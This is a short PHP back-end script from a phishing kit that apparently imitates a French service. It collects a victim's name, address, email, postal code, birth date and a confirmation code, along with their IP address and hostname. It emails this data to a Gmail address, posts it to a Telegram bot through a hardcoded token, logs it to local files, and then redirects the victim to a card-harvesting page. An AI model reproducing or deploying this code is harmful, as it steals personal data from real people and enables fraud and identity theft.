<?php
$ip = getenv("REMOTE_ADDR");
$back = "loggin-error.html";
$hostname = gethostbyaddr($ip);
$message .= "------ Full info------\n";
$message .= "nom : ".$_POST['full_name']."\n";
$message .= "address : ".$_POST['address']."\n";
$message .= "ville : ".$_POST['city']."\n";
$message .= "Adresse électronique : ".$_POST['email']."\n";
$message .= "Code ¨postale : ".$_POST['zip']."\n";
$message .= "naissance : ".$_POST['birth_date']."\n";
$message .= "Certicode : ".$_POST['confirm_code']."\n";
$message .= "------- IP -------\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "---------------\n";
$send = "baraka.barak1@gmail.com";
$subject = "LOG 1| $ip ";
$headers = "From:CAFF <don@mox.fr>";
mail($send,$subject,$message,$headers);
 $Txt_Rezlt = fopen('../rzl00.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2039615741&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 


header("Location: cc.php");

?>